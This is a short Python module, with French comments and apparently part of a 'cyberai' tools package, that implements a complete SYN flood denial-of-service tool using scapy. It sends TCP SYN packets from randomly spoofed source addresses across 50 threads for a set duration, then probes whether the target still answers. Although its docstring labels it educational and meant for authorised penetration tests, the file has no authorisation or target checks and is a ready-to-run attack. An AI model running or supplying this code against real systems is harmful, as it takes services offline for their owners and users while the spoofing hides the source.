"""Outils DoS éducatifs pour tests d'intrusion autorisés"""
import random
import time
import logging
from threading import Thread

from scapy.all import IP, TCP, send, sr1

logger = logging.getLogger("cyberai.tools.dos")


class SynFlood:
    """SYN flood avec spoofing, multithreading et monitoring"""

    def __init__(self, cible: str, port: int = 80, threads: int = 50):
        self.cible = cible
        self.port = port
        self.threads = threads
        self.running = False
        self.packets_sent = 0

    def _flood(self):
        while self.running:
            ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            sport = random.randint(1024, 65535)
            pkt = IP(src=ip, dst=self.cible) / TCP(sport=sport, dport=self.port, flags="S")
            send(pkt, verbose=0)
            self.packets_sent += 1

    def start(self, duree: int = 30) -> int:
        """Lance l'attaque pendant X secondes"""
        self.running = True
        workers = []
        for _ in range(self.threads):
            t = Thread(target=self._flood, daemon=True)
            t.start()
            workers.append(t)

        logger.info(f"🚀 SYN flood lancé sur {self.cible}:{self.port} ({self.threads} threads)")
        time.sleep(duree)
        self.running = False

        for t in workers:
            t.join(timeout=1)

        logger.info(f"✅ Terminé — {self.packets_sent} paquets envoyés en {duree}s")
        return self.packets_sent

    def monitor(self) -> str:
        """Vérifie si la cible répond encore"""
        sonde = IP(dst=self.cible) / TCP(dport=self.port, flags="S")
        reponse = sr1(sonde, timeout=2, verbose=0)
        if reponse and reponse.haslayer(TCP) and reponse.getlayer(TCP).flags == 0x12:
            return "✅ Cible toujours active"
        return "⚠️ Cible potentiellement affectée"